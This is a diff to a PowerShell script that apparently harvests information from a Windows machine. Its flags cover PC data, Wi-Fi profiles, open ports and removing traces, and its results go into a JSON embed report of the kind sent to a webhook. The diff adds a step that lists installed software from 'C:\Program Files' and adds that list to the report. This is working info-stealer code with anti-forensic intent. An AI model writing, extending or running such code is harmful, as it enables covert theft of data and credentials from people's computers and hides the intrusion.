@@ -38,6 +38,7 @@ if (-not (Test-Path variable:gatherPcData)) {   $gatherPcData = $true }
 if (-not (Test-Path variable:gatherWifiProfiles)) {   $gatherWifiProfiles = $true }
 if (-not (Test-Path variable:gatherOpenPorts)) {   $gatherOpenPorts = $true }
 if (-not (Test-Path variable:removeTraces)) {   $removeTraces = $true }
+if (-not (Test-Path variable:gatherInstalledSoftware)) { $gatherInstalledSoftware = $true }
 
 ## PC Dump
 if ($gatherPcData) {
@@ -62,6 +63,15 @@ if ($gatherOpenPorts) {
     $tcpPorts = Get-NetTCPConnection | Where-Object { $_.State -eq 'Listen' } | Select-Object -ExpandProperty LocalPort | Sort-Object -Unique
     $udpPorts = Get-NetUDPEndpoint | Select-Object -ExpandProperty LocalPort | Sort-Object -Unique
     $openPorts = "TCP: `n$($tcpPorts -join ', ')`n`nUDP: `n$($udpPorts -join ', ')"
+}
+
+## Installed Software
+if ($gatherInstalledSoftware) {
+    Write-Output "[ + ] Gathering installed software"
+    $installedSoftware = Get-ChildItem -Path "C:\Program Files" | Select-Object -ExpandProperty Name | Out-String
+    if ([string]::IsNullOrEmpty($installedSoftware)) {
+        $installedSoftware = "ERROR: No software found or access denied"
+    }
 }
 
 ## Json body
@@ -150,6 +160,15 @@ $json = @{
                 color = 0
                 author = @{
                     name = "Open Ports"
+                }
+            }
+        }
+        if ($gatherInstalledSoftware) {
+            @{
+                description = "``````$($installedSoftware)``````"
+                color = 0
+                author = @{
+                    name = "Installed Software"
                 }
             }
         }
